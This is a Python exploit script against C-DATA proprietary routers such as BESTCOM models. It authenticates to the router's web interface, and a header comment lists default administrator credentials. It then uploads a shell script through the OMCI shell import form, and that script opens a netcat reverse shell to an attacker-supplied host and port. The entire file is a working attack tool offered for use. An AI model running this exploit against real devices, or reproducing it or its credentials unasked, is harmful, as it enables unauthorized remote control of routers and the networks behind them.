#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author: Samir Sanchez Garnica and Luis Jacome Valencia
# Description: This script exploits a vulnerability in the OMCISHELL object for C-DATA proprietary routers such as BESTCOMs.
# you can use the next users: adminisp:adminisp or e8c:1f7486ad

import requests
import argparse

class ExploitOMCI():
    def __init__(self, username, password, target, lhost, lport):
        self.username = username
        self.passwd = password
        self.target = target
        self.lhost = lhost
        self.lport = lport
    
    def authenticate(self):
        self.data_auth = "username={}&psd={}".format(self.username, self.passwd)
        self.path_login = "http://{}/boaform/admin/formLogin".format(self.target)
        print("[+] Authenticating with user: {0} pwd: {1}".format(self.username, self.passwd))
        self.headers_auth = {
            'Host': '{}'.format(self.target),
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': '{}'.format(str(len(self.data_auth)))
        }

        self.response_auth = requests.request("POST", self.path_login, headers=self.headers_auth, data=self.data_auth)
        if 'bad password' in self.response_auth.text:
            print("[+] Credentials Wrong")
            return
    
    def exploit(self):
        self.data = '-----------------------------358167974513189061271693647429\x0d\x0aContent-Disposition: form-data; name=\"binary\"; filename=\"sam.sh\"\x0d\x0aContent-Type: application/x-sh\x0d\x0a\x0d\x0a#!/bin/sh\x0d\x0arm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc '+self.lhost+' '+self.lport+' >/tmp/f\x0d\x0a-----------------------------358167974513189061271693647429\x0d\x0aContent-Disposition: form-data; name=\"load\"\x0d\x0a\x0d\x0aImport\x0d\x0a-----------------------------358167974513189061271693647429--\x0d\x0a'
        self.headers = {
            'Host': '{}'.format(self.target),
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0',
            'Accept': 'text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'multipart/form-data; boundary=---------------------------358167974513189061271693647429',
            'Content-Length': '{}'.format(str(len(self.data))),
            'Origin': 'http://{}'.format(self.target),
            'Connection': 'close',
            'Referer': 'http://{}/bd/vermod.asp'.format(self.target),
            'Upgrade-Insecure-Requests': '1',
        }
        try:
            self.response = requests.post('http://'+self.target+'/boaform/formImportOMCIShell', headers=self.headers, data=self.data, verify=False)
            print(self.response.text)
        except Exception as e:
            if 'BadStatusLine' in str(e):
                print("[+] Getting shell sucesfull...")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--username", dest="username", help="Enter the administrator user of the router", required=True)
    parser.add_argument("--password", dest="password", help="Enter the admin password of the router", required=True)
    parser.add_argument("--target", dest="target", help="Enter router ip address", required=True)
    parser.add_argument("--lhost", dest="lhost", help="Enter your lhost", required=True)
    parser.add_argument("--lport", dest="lport", help="Enter your lport", required=True)
    args = parser.parse_args()
    
    if args.username is None or args.password is None or args.target is None or args.lhost is None or args.lport is None:
        parser.print_help()
    
    instance = ExploitOMCI(args.username, args.password, args.target, args.lhost, args.lport)
    instance.authenticate()
    instance.exploit()

if __name__ == "__main__":
    main()
